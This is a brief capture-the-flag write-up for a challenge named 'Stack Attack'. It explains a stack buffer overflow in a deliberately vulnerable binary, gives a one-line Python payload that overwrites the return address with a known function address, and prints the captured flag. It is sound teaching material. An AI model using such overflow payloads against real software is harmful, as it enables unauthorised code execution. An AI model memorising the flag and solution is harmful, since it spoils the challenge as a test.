# Stack Attack

**Points: 500**  
**Hint:** A classic buffer overflow

## Solution

### Analysis

Running the binary reveals the vulnerability:

```bash
chmod +x stack_attack
./stack_attack
```

Output:
```
=== RETRO BUFFER OVERFLOW CHALLENGE ===
Useful information:
- Buffer size: 64 bytes
- No canary protection
- ASLR: Disabled for this challenge
- win_function address: 0x40123c
```

### Exploit

The stack layout: `[64-byte buffer][8-byte saved RBP][8-byte return address]`

Craft payload to overwrite the return address with `win_function` (0x40123c):

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A' * 64 + b'B' * 8 + b'\x3c\x12\x40\x00\x00\x00\x00\x00')" | ./stack_attack
```

Output:
```
Access granted! flg: CSC26{st4ck_4tt4ck_26}
```

### Flag

```
CSC26{st4ck_4tt4ck_26}
```
